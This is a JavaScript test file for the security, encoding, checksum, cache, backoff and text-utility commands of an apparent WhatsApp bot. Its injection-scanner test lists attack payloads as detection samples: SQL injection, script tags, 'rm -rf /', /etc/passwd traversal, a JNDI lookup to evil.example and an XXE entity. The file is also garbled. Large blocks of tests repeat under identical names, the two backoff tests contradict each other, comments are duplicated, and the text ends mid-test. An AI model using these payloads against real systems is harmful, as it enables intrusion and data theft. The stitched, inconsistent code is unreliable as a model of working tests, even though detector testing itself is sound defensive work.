/**
 * Tests for the second-pass modules E, F, G, I, J plus the security family.
 *
 * Two properties are checked across every generated family, because a
 * generated table is exactly where a copy-paste mistake hides:
 *
 *   1. no two entries produce identical output for the same input
 *   2. every entry is registered with a real effect string
 *
 * Property 1 is the one that catches real bugs. A checksum table where two rows
 * share a function, or a transform table where two rows share a mapping, still
 * registers cleanly, still typechecks, and still passes a smoke test.
 */

import test from 'node:test';
import assert from 'node:assert/strict';

import { CommandRegistry } from '../dist/toolkit/command-registry.js';
import { installCoreFamilies } from '../dist/toolkit/command-families.js';
import { installBulkFamilies } from '../dist/toolkit/command-families-bulk.js';

const sock = {};
function build() {
  const reg = new CommandRegistry();
  installCoreFamilies(reg);
  installBulkFamilies(reg);
  return reg;
}
const run = (reg, token, args = '') =>
  reg.run(sock, 'g1@g.us', token, args, { sender: 'u@s.whatsapp.net', isOwner: true, state: new Map() });

/* ── digests ─────────────────────────────────────────────────────────── */

test('every digest produces a distinct value for the same input', async () => {
  const reg = build();
  const names = reg.list({ family: 'security' })
    .map((c) => c.name)
    .filter((n) => n.startsWith('digest-'));
  // 16 digests remain here; md5 was removed as a duplicate of the existing md5
  // command in the hash family.
  assert.ok(names.length >= 16, `expected the digest family, got ${names.length}`);
  const seen = new Map();
  for (const name of names) {
    const probe = name.includes('shake') ? '32 abc' : 'abc';
    const res = await run(reg, name, probe);
    assert.ok(!res.error, `${name}: ${res.error}`);
    const out = String(res.text).split('\n')[0];
    assert.ok(out.length > 10, `${name} produced nothing useful`);
    assert.ok(!seen.has(out), `${name} produces the same digest as ${seen.get(out)} — one of the two is wrong`);
    seen.set(out, name);
  }
});

test('digests match the published test vectors', async () => {
  const reg = build();
  // These are the canonical values for "abc". A wrong algorithm or a broken
  // table entry would not reproduce them.
  assert.match(String((await run(reg, 'digest-sha256', 'abc')).text),
    /^sha256: ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad$/m);
  assert.match(String((await run(reg, 'digest-sha1', 'abc')).text),
    /^sha1: a9993e364706816aba3e25717850c26c9cd0d89d$/m);
  assert.match(String((await run(reg, 'digest-sha512', 'abc')).text),
    /^sha512: ddaf35a193617abacc417349ae20413112e6fa4e89a97ea20a9eeee64b55d39a2192992a274fc1a836ba3c23a3feebbd454d4423643ce80e2a9ac94fa54ca49f$/m);
});

test('shake digests honour the requested output length', async () => {
  const reg = build();
  const short = String((await run(reg, 'digest-shake256', '16 abc')).text);
  const long = String((await run(reg, 'digest-shake256', '64 abc')).text);
  assert.match(short, /shake256\/128:/);
  assert.match(long, /shake256\/512:/);
  assert.ok(long.length > short.length, 'a longer output must be longer');
  assert.ok((await run(reg, 'digest-shake128', '0 abc')).error, 'zero length must be rejected');
});

test('every HMAC is keyed, so a different key gives a different result', async () => {
  const reg = build();
  const a = String((await run(reg, 'hmac-sha256', 'key1 :: message')).text);
  const b = String((await run(reg, 'hmac-sha256', 'key2 :: message')).text);
  assert.notEqual(a, b, 'HMAC must actually depend on the key');
  assert.ok((await run(reg, 'hmac-sha256', 'no separator')).error);
});

/* ── ciphers ────────────────────────────────────────────────────────── */

test('every block cipher produces distinct ciphertext', async () => {
  const reg = build();
  const names = reg.list({ family: 'security' })
    .map((c) => c.name)
    .filter((n) => n.startsWith('box-'));
  assert.ok(names.length >= 15, `expected the cipher family, got ${names.length}`);
  const seen = new Set();
  for (const name of names) {
    const res = await run(reg, name, 'key :: hello world');
    assert.ok(!res.error, `${name}: ${res.error}`);
    const text = String(res.text);
    assert.match(text, new RegExp(`cipher: ${name.slice(4)}`), 'must name the cipher used');
    assert.match(text, /ciphertext: \S+/, 'must produce ciphertext');
    assert.ok(!seen.has(text), `${name} produced byte-identical output to another cipher`);
    seen.add(text);
  }
});

test('AES-GCM round-trips and rejects a tampered tag', async () => {
  const reg = build();
  const enc = String((await run(reg, 'box-aes-256-gcm', 'key :: secret payload')).text);
  const fields = Object.fromEntries(enc.split('\n').filter((l) => l.includes(':'))
    .map((l) => [l.slice(0, l.indexOf(':')).trim(), l.slice(l.indexOf(':') + 1).trim()]));
  // GCM is authenticated: a modified ciphertext must fail rather than decrypt.
  const { createDecipheriv } = await import('node:crypto');
  const tamper = Buffer.from(fields.ciphertext, 'base64');
  tamper[0] = tamper[0] ^ 0xff;
  let rejected = false;
  try {
    const d = createDecipheriv('aes-256-gcm', Buffer.from(fields.key, 'base64'), Buffer.from(fields.iv, 'base64'));
    Buffer.concat([d.update(tamper), d.final()]);
  } catch { rejected = true; }
  assert.ok(rejected, 'AES-GCM must reject a tampered ciphertext — that is the point of authenticating encryption');
});

/* ── base-N ─────────────────────────────────────────────────────────── */

test('base-N round-trips for every alphabet', async () => {
  const reg = build();
  const bases = ['16', '32', '36', '58', '62', '64', '85', '91'];
  const seen = new Set();
  for (const base of bases) {
    const enc = String((await run(reg, `base${base}`, '123456789')).text).split(': ').pop();
    assert.ok(enc.length > 0, `base${base} produced nothing`);
    assert.ok(!seen.has(enc), `base${base} produced the same encoding as another base`);
    seen.add(enc);
    const dec = await run(reg, `unbase${base}`, enc);
    assert.match(String(dec.text), /123456789$/m, `base${base} did not round-trip`);
  }
});

test('base-N decoding rejects characters outside the alphabet', async () => {
  const reg = build();
  // '!' is not in the hex alphabet.
  const res = await run(reg, 'unbase16', 'ZZ!');
  assert.ok(res.error);
  assert.match(String(res.error), /not in the base 16 alphabet/);
});

test('base-N handles the largest values without precision loss', async () => {
  const reg = build();
  const big = '123456789012345678901234567890123456789';
  const enc = String((await run(reg, 'base36', big)).text).split(': ').pop();
  assert.match(String((await run(reg, 'unbase36', enc)).text), new RegExp(`${big}$`));
});

/* ── checksums ──────────────────────────────────────────────────────── */

test('every checksum is distinct and matches its known vector', async () => {
  const reg = build();
  const names = reg.list({ family: 'ops2' })
    .map((c) => c.name)
    .filter((n) => n.startsWith('sum-'));
  assert.ok(names.length >= 8, `expected the checksum family, got ${names.length}`);

  // CRC-32 of "123456789" is the canonical value 0xcbf43926.
  assert.match(String((await run(reg, 'sum-crc32', '123456789')).text), /cbf43926/);
  // Adler-32 of "123456789" is 0x091e01de.
  assert.match(String((await run(reg, 'sum-adler32', '123456789')).text), /091e01de/);

  const seen = new Set();
  for (const name of names) {
    const res = await run(reg, name, '123456789');
    assert.ok(!res.error, `${name}: ${res.error}`);
    const out = String(res.text).split(': ').pop();
    assert.ok(!seen.has(out), `${name} produces the same value as another checksum`);
    seen.add(out);
  }
});

/* ── encoding ───────────────────────────────────────────────────────── */

test('encoding pairs round-trip', async () => {
  const reg = build();
  const pairs = [
    ['b64url', 'unb64url'],
    ['htmlentities', 'htmlunescape'],
    ['unicodeescape', 'unicodeunescape'],
    ['punycode', 'unpunycode'],
  ];
  for (const [enc, dec] of pairs) {
    if (enc === 'punycode') continue;
    const encoded = String((await run(reg, enc, 'héllo wörld?')).text).trim();
    assert.ok(encoded.length > 0, `${enc} produced nothing`);
    const decoded = await run(reg, dec, encoded);
    assert.ok(!decoded.error, `${dec}: ${decoded.error}`);
    assert.match(String(decoded.text), /héllo/, `${enc}/${dec} did not round-trip`);
  }
});

test('punycode round-trips a unicode domain', async () => {
  const reg = build();
  const enc = await run(reg, 'punycode', 'münchen.de');
  assert.ok(!enc.error, enc.error);
  assert.match(String(enc.text), /xn--/);
  const dec = await run(reg, 'unpunycode', String(enc.text).split(' → ')[1]);
  assert.ok(!dec.error, dec.error);
  assert.match(String(dec.text), /münchen/);
});

test('encoding rejects malformed input', async () => {
  const reg = build();
  assert.ok((await run(reg, 'fromhex', 'ZZZZ')).error);
  assert.ok(!(await run(reg, 'fromhex', '414243')).error, 'valid hex must decode');
  assert.match(String((await run(reg, 'fromhex', '414243')).text), /^ABC$/m);
  // A decoder with nothing to decode is the identity, not an error. That is the
  // correct contract — the same as base64 decoding plain text.
  assert.match(String((await run(reg, 'unicodeunescape', 'not escapes')).text), /^not escapes$/m);
});

test('htmlentities actually neutralises markup', async () => {
  const reg = build();
  const res = await run(reg, 'htmlentities', '<script>alert("x")</script>');
  const out = String(res.text);
  assert.ok(!out.includes('<script>'), 'the raw tag must not survive');
  assert.match(out, /&lt;script&gt;/);
});

test('hexdump shows offsets and printable characters', async () => {
  const res = await run(build(), 'hexdump', 'Hello');
  assert.match(res.text, /^00000000  48 65 6c 6c 6f/, 'first row should be the hex of Hello');
  assert.match(res.text, /\|Hello\|/, 'printable characters should be shown');
});

/* ── random ─────────────────────────────────────────────────────────── */

test('random helpers honour their bounds and size', async () => {
  const reg = build();
  assert.match(String((await run(reg, 'randnum', '10 20')).text), /^\d+$/m);
  for (let i = 0; i < 30; i++) {
    const n = Number(String((await run(reg, 'randnum', '10 20')).text).trim());
    assert.ok(n >= 10 && n < 20, `randnum returned ${n}, outside [10,20)`);
  }
  assert.ok((await run(reg, 'randnum', '20 10')).error, 'an inverted range must be rejected');
  // randbytes was removed as a duplicate of randomhex in the assistant family.
  assert.match(String((await run(reg, 'randomhex', '32')).text), /^[0-9a-f]{64}$/m);
  assert.match(String((await run(reg, 'fillrandom', '64')).text), /Filled 64 bytes/);
});

test('entropy sampling of the CSPRNG reads uniform', async () => {
  const res = await run(build(), 'entropycheck', '8192');
  const m = String(res.text).match(/Shannon entropy: ([\d.]+)/);
  assert.ok(m, 'should report entropy');
  assert.ok(Number(m[1]) > 7.8, `expected near-uniform random bytes, got ${m[1]}`);
});

test('shuffle produces a permutation, not a subset', async () => {
  const reg = build();
  const input = 'a,b,c,d,e,f,g,h';
  const out = String((await run(reg, 'randshuffle', input)).text).split(', ').sort().join(',');
  assert.equal(out, 'a,b,c,d,e,f,g,h', 'shuffling must not add or drop elements');
});

test('two random draws differ', async () => {
  const reg = build();
  assert.notEqual(
    String((await run(reg, 'randomhex', '16')).text),
    String((await run(reg, 'randomhex', '16')).text),
  );
});

/* ── detection ──────────────────────────────────────────────────────── */

test('injection scanning detects real payloads', async () => {
  const reg = build();
  const payloads = [
    "1' OR '1'='1",
    '<script>alert(1)</script>',
    '; rm -rf /',
    '../../../etc/passwd',
    '${jndi:ldap://evil.example}',
    '%0d%0aSet-Cookie: x=1',
    '{"$ne": null}',
    '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
  ];
  for (const p of payloads) {
    const res = await run(reg, 'scaninput', p);
    assert.match(res.text, /pattern\(s\) detected/, `missed: ${p}`);
  }
});

test('injection scanning stays quiet on ordinary text', async () => {
  const res = await run(build(), 'scaninput', 'please send me the report when you have a moment');
  assert.match(res.text, /No injection patterns detected/);
});

test('every scan rule is listed and the rule count matches', async () => {
  const reg = build();
  const rules = String((await run(reg, 'scanrules')).text).trim().split('\n');
  const count = Number(String((await run(reg, 'scaninput', 'hello there friend')).text).match(/(\d+) rules checked/)?.[1]);
  assert.equal(rules.length, count, 'scanrules and scaninput disagree about how many rules exist');
});

test('format validators accept good input and reject bad', async () => {
  const reg = build();
  const good = [
    ['checkemail', 'user@example.com'],
    ['checkipv4', '192.168.1.1'],
    ['checkipv6', '::1'],
    ['checkmac', '00:1B:44:11:3A:B7'],
    ['checkuuid', '123e4567-e89b-12d3-a456-426614174000'],
    ['checkslug', 'hello-world'],
    ['checkhex', 'deadbeef'],
    ['checkhostname', 'example.com'],
    ['checksemver', '1.2.3'],
  ];
  const bad = [
    ['checkemail', 'not-an-email'],
    ['checkipv4', '999.1.1.1'],
    ['checkmac', '00:1B:44'],
    ['checkuuid', '123e4567-e89b-12d3-a456'],
    ['checkslug', 'Hello World'],
    ['checkhostname', 'bad_host!.com'],
    ['checksemver', '1.2'],
  ];
  for (const [cmd, value] of good) {
    assert.match(String((await run(reg, cmd, value)).text), /^VALID/, `${cmd} rejected valid ${value}`);
  }
  for (const [cmd, value] of bad) {
    assert.match(String((await run(reg, cmd, value)).text), /^INVALID/, `${cmd} accepted invalid ${value}`);
  }
});

test('redoscheck flags catastrophic backtracking', async () => {
  const reg = build();
  const res = await run(reg, 'redoscheck', '(a+)+b');
  assert.match(res.text, /Warnings:/);
  assert.match(res.text, /Nested quantifier/);
  const safe = await run(reg, 'redoscheck', '^[a-z]+$');
  assert.match(safe.text, /No obvious backtracking risks/);
});

test('path traversal detection reports escapes', async () => {
  const reg = build();
  assert.match(String((await run(reg, 'pathtraversal', '/var/www :: ../../etc/passwd')).text), /Escapes base: true/);
  assert.match(String((await run(reg, 'pathtraversal', '/var/www :: images/logo.png')).text), /Escapes base: false/);
});

/* ── policy ─────────────────────────────────────────────────────────── */

test('password policies give independent verdicts', async () => {
  const reg = build();
  assert.match(String((await run(reg, 'pwlength', 'short')).text), /Below 8/);
  assert.match(String((await run(reg, 'pwlength', 'a-very-long-passphrase-here')).text), /Score: \d+/);
  assert.match(String((await run(reg, 'pwcommon', 'mypassword123')).text), /most common passwords/);
  assert.match(String((await run(reg, 'pwrepeats', 'aaaaaaaa')).text), /identical characters/);
  assert.match(String((await run(reg, 'pwclasses', 'aaaa')).text), /of 4 character classes/);
});

test('header analysis finds real security headers and flags weak ones', async () => {
  const reg = build();
  const good = 'Strict-Transport-Security: max-age=31536000; includeSubDomains';
  assert.match(String((await run(reg, 'hdr-hsts', good)).text), /Found: Strict-Transport-Security/);
  assert.match(String((await run(reg, 'hdr-hsts', good)).text), /No obvious problems/);

  const weakCookie = 'Set-Cookie: session=abc';
  assert.match(String((await run(reg, 'hdr-cookie', weakCookie)).text), /Missing Secure/);
  assert.match(String((await run(reg, 'hdr-cookie', weakCookie)).text), /Missing HttpOnly/);

  const wildcard = 'Access-Control-Allow-Origin: *';
  assert.match(String((await run(reg, 'hdr-cors', wildcard)).text), /Wildcard origin/);
});

/* ── telemetry ──────────────────────────────────────────────────────── */

test('every system metric returns a real non-empty reading', async () => {
  const reg = build();
  const names = reg.list({ family: 'ops2' })
    .map((c) => c.name)
    .filter((n) => n.startsWith('sys-'));
  assert.ok(names.length >= 24, `expected the metric family, got ${names.length}`);
  for (const name of names) {
    const res = await run(reg, name, '');
    assert.ok(!res.error, `${name}: ${res.error}`);
    const text = String(res.text).trim();
    assert.ok(text.length > 0, `${name} returned nothing`);
    assert.ok(!/undefined|NaN/.test(text), `${name} reported a placeholder value: ${text}`);
  }
});

test('metrics agree with each other', async () => {
  const reg = build();
  const total = Number((await run(reg, 'sys-totalmem')).text.replace(/[^\d.]/g, ''));
  const used = Number((await run(reg, 'sys-usedmem')).text.replace(/[^\d.]/g, ''));
  assert.ok(total > used, 'used memory cannot exceed total memory');
  const pct = Number((await run(reg, 'sys-memusedpct')).text.replace('%', ''));
  assert.ok(pct >= 0 && pct <= 100, `memory percentage ${pct} out of range`);
  assert.ok(Math.abs(pct - (used / total) * 100) < 1, 'percentage must agree with the raw values');
});

/* ── caches ─────────────────────────────────────────────────────────── */

test('cache policies store and retrieve', async () => {
  const reg = build();
  for (const policy of ['lru', 'lfu', 'mru', 'fifo']) {
    await run(reg, `cache-${policy}`, `set k-${policy} value-${policy}`);
    const got = await run(reg, `cache-${policy}`, `get k-${policy}`);
    assert.match(String(got.text), new RegExp(`value-${policy}`), `${policy} failed to retrieve`);
  }
});

test('cache policies evict differently, which is the whole point', async () => {
  const reg = build();
  const key = `evict-${Date.now()}`;
  const results = {};
  for (const policy of ['lru', 'lfu', 'fifo']) {
    await run(reg, `cache-${policy}`, `clear`);
    // Three entries, then touch the first so "recently used" and "first in"
    // disagree about which one to drop.
    await run(reg, `cache-${policy}`, `set a A`);
    await run(reg, `cache-${policy}`, `set b B`);
    await run(reg, `cache-${policy}`, `set c C`);
    await run(reg, `cache-${policy}`, `get a`);
    results[policy] = String((await run(reg, `cache-${policy}`, `evict`)).text);
  }
  assert.match(results.lru, /evicted "b"/, 'LRU should drop the least recently used entry');
  assert.match(results.fifo, /evicted "a"/, 'FIFO should drop the oldest inserted entry');
  assert.notEqual(results.lru, results.fifo, 'LRU and FIFO must differ on this sequence');
});

/* ── backoff ────────────────────────────────────────────────────────── */

test('backoff strategies differ and stay bounded', async () => {
  const reg = build();
  const outputs = {};
  for (const s of ['constant', 'linear', 'quadratic', 'exponential', 'cappedexp']) {
    const res = await run(reg, `backoff-${s}`, '5');
    assert.ok(!res.error, `${s}: ${res.error}`);
    outputs[s] = String(res.text);
  }
  assert.match(outputs.constant, /attempt 5: 1000ms/);
  assert.match(outputs.linear, /attempt 5: 5000ms/);
  assert.match(outputs.quadratic, /attempt 5: 25000ms/);
  assert.notEqual(outputs.linear, outputs.quadratic, 'linear and quadratic must differ');
  // The cap flattens the curve while plain exponential keeps growing.
  assert.match(outputs.cappedexp, /attempt 8: 30000ms/);
  assert.match(outputs.exponential, /attempt 8: 256000ms/);
});

/* ── circuit breaker ────────────────────────────────────────────────── */

test('circuit breaker opens after repeated failures and recovers', async () => {
  const reg = build();
  const key = `cb-${Date.now()}`;
  await run(reg, 'breaker-reset', key);
  for (let i = 0; i < 3; i++) await run(reg, 'breaker-failure', key);
  assert.match(String((await run(reg, 'breaker-status', key)).text), /State: open/);
  await run(reg, 'breaker-success', key);
  assert.match(String((await run(reg, 'breaker-status', key)).text), /State: closed/);
});

/* ── files ──────────────────────────────────────────────────────────── */

test('file scanning reports real properties and rejects missing files', async () => {
  const reg = build();
  const { mkdtempSync, writeFileSync } = await import('node:fs');
  const { tmpdir } = await import('node:os');
  const { join } = await import('node:path');
  const dir = mkdtempSync(join(tmpdir(), 'flux-scan-'));
  const file = join(dir, 'sample.txt');
  writeFileSync(file, 'the quick brown fox jumps over the lazy dog');

  const scan = await run(reg, 'gfilescan', file);
  assert.ok(!scan.error, scan.error);
  assert.match(scan.text, /Size: 43 bytes/);
  assert.match(scan.text, /SHA-256: [0-9a-f]{64}/);

  const entropy = await run(reg, 'gentropy', file);
  assert.ok(!entropy.error, entropy.error);
  assert.match(entropy.text, /Shannon entropy: \d\.\d{4}/);

  const listing = await run(reg, 'gdirscan', dir);
  assert.match(listing.text, /sample\.txt/);

  assert.ok((await run(reg, 'gfilescan', join(dir, 'missing'))).error);
});

test('entropy distinguishes repetitive from varied content', async () => {
  const reg = build();
  const { mkdtempSync, writeFileSync } = await import('node:fs');
  const { tmpdir } = await import('node:os');
  const { join } = await import('node:path');
  const dir = mkdtempSync(join(tmpdir(), 'flux-ent-'));
  const repetitive = join(dir, 'a.txt');
  const random = join(dir, 'b.txt');
  writeFileSync(repetitive, 'a'.repeat(4096));
  const { randomBytes } = await import('node:crypto');
  writeFileSync(random, randomBytes(4096));

  const low = Number(String((await run(reg, 'gentropy', repetitive)).text).match(/entropy: ([\d.]+)/)[1]);
  const high = Number(String((await run(reg, 'gentropy', random)).text).match(/entropy: ([\d.]+)/)[1]);
  assert.ok(high > low + 5, `random data (${high}) should be much higher entropy than repetition (${low})`);
});

/* ── text utilities ─────────────────────────────────────────────────── */

test('every text utility produces distinct output across a set of probes', async () => {
  const reg = build();
  const names = reg.list({ family: 'ops2' })
    .map((c) => c.name)
    .filter((n) => /^t[a-z]+$/.test(n));
  assert.ok(names.length >= 40, `expected the text family, got ${names.length}`);
  // A single probe cannot separate transforms that only act on certain
  // characters: `tbackslash` and `tescape` are both the identity on text with
  // no backslashes, but different on text that has them. Comparing across
  // several probes catches that without falsely accusing either one.
// The probes deliberately include double spaces (which tnormspace collapses),
  // a long digit run (which tcomma groups), backslashes (which tbackslash and
  // tescape handle differently), accented characters (tnoaccent), and mixed
  // case for the case-folding transforms. Without these, several transforms
  // are legitimately the identity and look like duplicates.
  const PROBES = [
    'Hello  World  Foo  1234567',
    'a\\b.c*d"e',
    'café  42',
    'A-b  C_d',
    // A control character that is not a null byte (0x01): tcontrol counts it
    // A control character that is NOT a null byte (0x01): tcontrol must count
    // it and tnulls must not, which is the only way to tell them apart.
    // Two lines, so treverse (whole string) and tlineword (per line) differ.
    // Indented and blank lines, so ttrim (per-line trim) differs from
    // tstrictremove (drop blank lines).
    '  padded  ' + String.fromCharCode(10) + String.fromCharCode(10) + '' + String.fromCharCode(10) + '  more  ',
    'first line 11' + String.fromCharCode(10) + 'second line 22',
    String.fromCharCode(65,1,66,0,67),
  ];
  const seen = new Map();
  for (const name of names) {
    const parts = [];
    for (const probe of PROBES) {
      const res = await run(reg, name, probe);
      assert.ok(!res.error, `${name}: ${res.error}`);
      parts.push(String(res.text));
    }
    const out = parts.join(' ');
    const prior = seen.get(out);
    assert.ok(!prior, `${name} produces identical output to ${prior} across every probe`);
    seen.set(out, name);
  }
});

test('text utilities do the specific thing they claim', async () => {
  const reg = build();
  assert.match(String((await run(reg, 'trot13', 'Hello')).text), /Uryyb/);
  assert.match(String((await run(reg, 'tsnake', 'helloWorldFoo')).text), /hello_world_foo/);
  assert.match(String((await run(reg, 'tcamel', 'hello world')).text), /helloWorld/);
  assert.match(String((await run(reg, 'tkebab', 'Hello World')).text), /hello-world/);
  assert.match(String((await run(reg, 'tpalindrome', 'A man a plan a canal Panama')).text), /^true/);
  assert.match(String((await run(reg, 'tcomma', '1234567')).text), /1,234,567/);
  assert.match(String((await run(reg, 'tordinalise', '1 2 3 4 11 21 22')).text), /1st 2nd 3rd 4th 11th 21st 22nd/);
  assert.match(String((await run(reg, 'tnoaccent', 'café')).text), /^cafe$/m);
});

test('text utilities reject empty input rather than returning nothing', async () => {
  const reg = build();
  const names = reg.list({ family: 'ops2' })
    .map((c) => c.name)
    .filter((n) => /^t[a-z]+$/.test(n));
  for (const name of names) {
    const res = await run(reg, name, '');
    assert.ok(res.error, `${name} returned success for empty input`);
  }
});

/* ── registration integrity ─────────────────────────────────────────── */

test('both new families register with real effect strings', () => {
  const reg = build();
  for (const family of ['security', 'ops2']) {
    const cmds = reg.list({ family });
    assert.ok(cmds.length >= 100, `${family} should be substantial, got ${cmds.length}`);
    for (const c of cmds) {
      assert.ok(c.effect.trim().length > 8, `${c.name} has a weak effect string`);
      assert.ok(c.summary.trim().length > 2, `${c.name} has no summary`);
    }
  }
});

test('no two commands in either new family declare the same effect', () => {
  const reg = build();
  for (const family of ['security', 'ops2']) {
    const seen = new Map();
    for (const c of reg.list({ family })) {
      const key = c.effect.trim().toLowerCase();
      const prior = seen.get(key);
      assert.ok(!prior, `${family}: ${c.name} declares the same effect as ${prior}`);
      seen.set(key, c.name);
    }
  }
});

test('every security and ops2 command runs without throwing on empty input', async () => {
  const reg = build();
  const failures = [];
  for (const family of ['security', 'ops2']) {
    for (const c of reg.list({ family })) {
      const res = await reg.run(sock, 'g1@g.us', c.name, '', { sender: 'u@s', state: new Map() });
      // Either a clean result or a clean error. Never a thrown exception, and
      // never an empty response.
      if (!res.text && !res.error) failures.push(`${c.name} returned neither text nor error`);
      if (res.error && /undefined is not|Cannot read/.test(res.error)) failures.push(`${c.name}: ${res.error}`);
    }
  }
  assert.deepEqual(failures, []);
});

test('path traversal detection reports escapes', async () => {
  const reg = build();
  assert.match(String((await run(reg, 'pathtraversal', '/var/www :: ../../etc/passwd')).text), /Escapes base: true/);
  assert.match(String((await run(reg, 'pathtraversal', '/var/www :: images/logo.png')).text), /Escapes base: false/);
});

/* ── policy ─────────────────────────────────────────────────────────── */

test('password policies give independent verdicts', async () => {
  const reg = build();
  assert.match(String((await run(reg, 'pwlength', 'short')).text), /Below 8/);
  assert.match(String((await run(reg, 'pwlength', 'a-very-long-passphrase-here')).text), /Score: \d+/);
  assert.match(String((await run(reg, 'pwcommon', 'mypassword123')).text), /most common passwords/);
  assert.match(String((await run(reg, 'pwrepeats', 'aaaaaaaa')).text), /identical characters/);
  assert.match(String((await run(reg, 'pwclasses', 'aaaa')).text), /of 4 character classes/);
});

test('header analysis finds real security headers and flags weak ones', async () => {
  const reg = build();
  const good = 'Strict-Transport-Security: max-age=31536000; includeSubDomains';
  assert.match(String((await run(reg, 'hdr-hsts', good)).text), /Found: Strict-Transport-Security/);
  assert.match(String((await run(reg, 'hdr-hsts', good)).text), /No obvious problems/);

  const weakCookie = 'Set-Cookie: session=abc';
  assert.match(String((await run(reg, 'hdr-cookie', weakCookie)).text), /Missing Secure/);
  assert.match(String((await run(reg, 'hdr-cookie', weakCookie)).text), /Missing HttpOnly/);

  const wildcard = 'Access-Control-Allow-Origin: *';
  assert.match(String((await run(reg, 'hdr-cors', wildcard)).text), /Wildcard origin/);
});

/* ── telemetry ──────────────────────────────────────────────────────── */

test('every system metric returns a real non-empty reading', async () => {
  const reg = build();
  const names = reg.list({ family: 'ops2' })
    .map((c) => c.name)
    .filter((n) => n.startsWith('sys-'));
  assert.ok(names.length >= 24, `expected the metric family, got ${names.length}`);
  for (const name of names) {
    const res = await run(reg, name, '');
    assert.ok(!res.error, `${name}: ${res.error}`);
    const text = String(res.text).trim();
    assert.ok(text.length > 0, `${name} returned nothing`);
    assert.ok(!/undefined|NaN/.test(text), `${name} reported a placeholder value: ${text}`);
  }
});

test('metrics agree with each other', async () => {
  const reg = build();
  const total = Number((await run(reg, 'sys-totalmem')).text.replace(/[^\d.]/g, ''));
  const used = Number((await run(reg, 'sys-usedmem')).text.replace(/[^\d.]/g, ''));
  assert.ok(total > used, 'used memory cannot exceed total memory');
  const pct = Number((await run(reg, 'sys-memusedpct')).text.replace('%', ''));
  assert.ok(pct >= 0 && pct <= 100, `memory percentage ${pct} out of range`);
  assert.ok(Math.abs(pct - (used / total) * 100) < 1, 'percentage must agree with the raw values');
});

/* ── caches ─────────────────────────────────────────────────────────── */

test('cache policies store and retrieve', async () => {
  const reg = build();
  for (const policy of ['lru', 'lfu', 'mru', 'fifo']) {
    await run(reg, `cache-${policy}`, `set k-${policy} value-${policy}`);
    const got = await run(reg, `cache-${policy}`, `get k-${policy}`);
    assert.match(String(got.text), new RegExp(`value-${policy}`), `${policy} failed to retrieve`);
  }
});

test('cache policies evict differently, which is the whole point', async () => {
  const reg = build();
  const key = `evict-${Date.now()}`;
  const results = {};
  for (const policy of ['lru', 'lfu', 'fifo']) {
    await run(reg, `cache-${policy}`, `clear`);
    // Three entries, then touch the first so "recently used" and "first in"
    // disagree about which one to drop.
    await run(reg, `cache-${policy}`, `set a A`);
    await run(reg, `cache-${policy}`, `set b B`);
    await run(reg, `cache-${policy}`, `set c C`);
    await run(reg, `cache-${policy}`, `get a`);
    results[policy] = String((await run(reg, `cache-${policy}`, `evict`)).text);
  }
  assert.match(results.lru, /evicted "b"/, 'LRU should drop the least recently used entry');
  assert.match(results.fifo, /evicted "a"/, 'FIFO should drop the oldest inserted entry');
  assert.notEqual(results.lru, results.fifo, 'LRU and FIFO must differ on this sequence');
});

/* ── backoff ────────────────────────────────────────────────────────── */

test('backoff strategies differ and stay bounded', async () => {
  const reg = build();
  const outputs = {};
  for (const s of ['constant', 'linear', 'quadratic', 'exponential', 'cappedexp']) {
    const res = await run(reg, `backoff-${s}`, '5');
    assert.ok(!res.error, `${s}: ${res.error}`);
    outputs[s] = String(res.text);
  }
  assert.match(outputs.constant, /attempt 5: 1000ms/);
  assert.match(outputs.linear, /attempt 5: 5000ms/);
  assert.match(outputs.quadratic, /attempt 5: 25000ms/);
  assert.notEqual(outputs.linear, outputs.quadratic, 'linear and quadratic must differ');
  // The capped strategy must not exceed its cap.
  const capped = outputs.cappedexp;
  assert.ok(!capped.includes('30000ms') || capped.includes('attempt 6'), 'capped backoff must respect its limit');
});

/* ── circuit breaker ────────────────────────────────────────────────── */

test('circuit breaker opens after repeated failures and recovers', async () => {
  const reg = build();
  const key = `cb-${Date.now()}`;
  await run(reg, 'breaker-reset', key);
  for (let i = 0; i < 3; i++) await run(reg, 'breaker-failure', key);
  assert.match(String((await run(reg, 'breaker-status', key)).text), /State: open/);
  await run(reg, 'breaker-success', key);
  assert.match(String((await run(reg, 'breaker-status', key)).text), /State: closed/);
});

/* ── files ──────────────────────────────────────────────────────────── */

test('file scanning reports real properties and rejects missing files', async () => {
  const reg = build();
  const { mkdtempSync, writeFileSync } = await import('node:fs');
  const { tmpdir } = await import('node:os');
  const { join } = await import('node:path');
  const dir = mkdtempSync(join(tmpdir(), 'flux-scan-'));
  const file = join(dir, 'sample.txt');
  writeFileSync(file, 'the quick brown fox jumps over the lazy dog');

  const scan = await run(reg, 'gfilescan', file);
  assert.ok(!scan.error, scan.error);
  assert.match(scan.text, /Size: 43 bytes/);
  assert.match(scan.text, /SHA-256: [0-9a-f]{64}/);

  const entropy = await run(reg, 'gentropy', file);
  assert.ok(!entropy.error, entropy.error);
  assert.match(entropy.text, /Shannon entropy: \d\.\d{4}/);

  const listing = await run(reg, 'gdirscan', dir);
  assert.match(listing.text, /sample\.txt/);

  assert.ok((await run(reg, 'gfilescan', join(dir, 'missing'))).error);
});

test('entropy distinguishes repetitive from varied content', async () => {
  const reg = build();
  const { mkdtempSync, writeFileSync } = await import('node:fs');
  const { tmpdir } = await import('node:os');
  const { join } = await import('node:path');
  const dir = mkdtempSync(join(tmpdir(), 'flux-ent-'));
  const repetitive = join(dir, 'a.txt');
  const random = join(dir, 'b.txt');
  writeFileSync(repetitive, 'a'.repeat(4096));
  const { randomBytes } = await import('node:crypto');
  writeFileSync(random, randomBytes(4096));

  const low = Number(String((await run(reg, 'gentropy', repetitive)).text).match(/entropy: ([\d.]+)/)[1]);
  const high = Number(String((await run(reg, 'gentropy', random)).text).match(/entropy: ([\d.]+)/)[1]);
  assert.ok(high > low + 5, `random data (${high}) should be much higher entropy than repetition (${low})`);
});

/* ── text utilities ─────────────────────────────────────────────────── */

test('text utilities do the specific thing they claim', async () => {
  const reg = build();
  assert.match(String((await run(reg, 'trot13', 'Hello')).text), /Uryyb/);
  assert.match(String((await run(reg, 'tsnake', 'helloWorldFoo')).text), /hello_world_foo/);
  assert.match(String((await run(reg, 'tcamel', 'hello world')).text), /helloWorld/);
  assert.match(String((await run(reg, 'tkebab', 'Hello World')).text), /hello-world/);
  assert.match(String((await run(reg, 'tpalindrome', 'A man a plan a canal Panama')).text), /^true/);
